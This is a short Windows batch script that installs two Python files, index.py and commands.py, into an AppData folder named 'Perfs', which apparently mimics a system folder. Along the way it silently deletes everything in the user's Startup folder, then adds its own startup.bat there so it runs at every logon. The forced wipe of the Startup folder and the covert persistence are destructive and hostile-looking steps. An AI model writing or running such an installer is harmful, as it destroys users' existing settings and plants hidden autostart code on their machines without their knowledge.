@echo off
mkdir "%USERPROFILE%\AppData\Local\Perfs"
echo y|del "%USERPROFILE%\AppData\Local\Perfs\*"
copy files\index.py  %USERPROFILE%\AppData\Local\Perfs\
copy files\commands.py  %USERPROFILE%\AppData\Local\Perfs\
echo y|del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\*"
copy startup.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
pip install -r requirements.txt
